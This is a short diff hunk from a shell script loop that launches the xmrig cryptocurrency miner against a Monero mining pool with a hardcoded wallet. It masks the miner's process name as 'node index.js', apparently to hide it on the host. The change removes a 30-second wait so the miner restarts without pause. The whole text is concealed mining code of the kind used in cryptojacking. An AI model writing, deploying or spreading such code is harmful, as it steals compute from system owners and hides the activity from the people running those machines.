@@ -46,7 +46,4 @@ while true; do
     else
         bash -c "exec -a \"node index.js\" \"./xmrig_$arch -o pool.hashvault.pro:443 -u 83CT41sGwJW8MsjcNeALMFHBoqMLfSwcqLAcB9w2sFhJBC6y5kGGoX1HmqPkBLCnjZgn52kAzye3EiTBbyjo2LJB1TEQsqs -p linux --tls -t $thread \""
     fi
-
-    echo "waiting 30s"
-    sleep 30
 done
